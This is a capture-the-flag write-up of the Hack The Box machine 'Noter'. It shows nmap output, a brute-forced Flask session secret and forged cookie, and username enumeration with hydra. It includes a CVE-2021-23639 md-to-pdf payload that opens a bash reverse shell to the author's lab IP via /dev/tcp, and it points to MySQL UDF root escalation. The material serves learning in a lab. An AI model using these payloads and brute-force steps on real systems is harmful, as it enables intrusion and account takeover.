# noterHTB
## nmap
```
nmap -sV -sC 10.10.11.160
Starting Nmap 7.80 ( https://nmap.org ) at 2022-05-12 18:13 CEST
Nmap scan report for 10.10.11.160
Host is up (0.062s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
|_http-title: Noter
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## Website
<img src="https://github.com/UllernJ/noterHTB/blob/main/noter.png">

## User
We try some standar easy admin/password combinations, but none of them works. So we go ahead and try to create our own user.
<p>Our new user is allowed to create notes, and what I first do here is getting tunnel vision and focusing on the xss posibility, after being down that rabit hole I realise that this isnt the intended way as none would be reading my notes.</p>
<p>Next thing I noticed is that our cookie is not a jwt token, therefore I did a little investigation and found out that flask also uses their own way to sign web tokens.</p>
<img src="https://github.com/UllernJ/noterHTB/blob/main/noter2.png">

### Token manipulation
I found this <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask">site</a> with some helpful commands.
```
flask-unsign --decode --cookie 'OURTOKEN'
{'logged_in': True, 'username': 'randomuser11'}
//Okay we know what our token contains, but what can we do now?
//We can bruteforce the secret.
flask-unsign --unsign --cookie < cookie.txt --wordlist rockyou.txt --no-literal-eval
[*] Session decodes to: {'logged_in': True, 'username': 'randomuser11'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 17024 attempts
b'secret123'
```
Okay now we have the secret key and can make a fake token for our user. So what we need to find now is other users to try this on.

### Finding other users.
When we try to login to our user with the wrong password is says: "Invalid login" meanwhile when you try a user that doesnt exist it says "Invalid credentials". Therefore we can filter out Invalid credtials and brute force our way to a user.
```
hydra 10.10.11.160 -s 5000 -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials" -p "a"
[5000][http-post-form] host: 10.10.11.160   login: blue   password: a
```
We find blue and we can forge a token to that user. We now have the login and we can access blue's notes. Also we can find his credentials to the ftp with more valueable information.
<img src="https://github.com/UllernJ/noterHTB/blob/main/noter3.png">
<img src="https://github.com/UllernJ/noterHTB/blob/main/noter4.png">

### ftp
On the ftp we find a policy.pdf file and we can read it. Its about all the companies policy on password.
<p> Specially this lines looks interesting: <b>Default user-password generated by the application is in the format of "username@site_name!" (This applies to all your applications)</b></p>
We try to enter the ftp_admin's ftp server and we can find the backup files to the webserver. With this information we can now figure out how we can do our reverse shell / break into the user.

### Reverse shell
When researching we can find two different exploits, one being the <a href="https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880">CVE-2021-23639</a> and breaking out of the single quotes on python. I decide to try the CVE exploit following:
<p></p>
1. I create two files named <b>bash</b> and <b>payload.md</b>.
<p></p>
In bash: the reverse shell.
<p></p>
In payload: ---js\n((require("child_process")).execSync("bash -i >& /dev/tcp/10.10.16.5/1234 0>&1
"))\n---RCE
2. I host a webserver and point them to my bash when they try to convert my .md file.
<p></p>
3. And we have user.
<img src="https://github.com/UllernJ/noterHTB/blob/main/noter5.png">

### Root
This part is a bit weird, but its actually something "easy". When we examined the app we got a root credientials to mysql and with that we can get root.
Everything is explained in <a href="https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf">this</a> article.

<img src="https://github.com/UllernJ/noterHTB/blob/main/noter6.png">
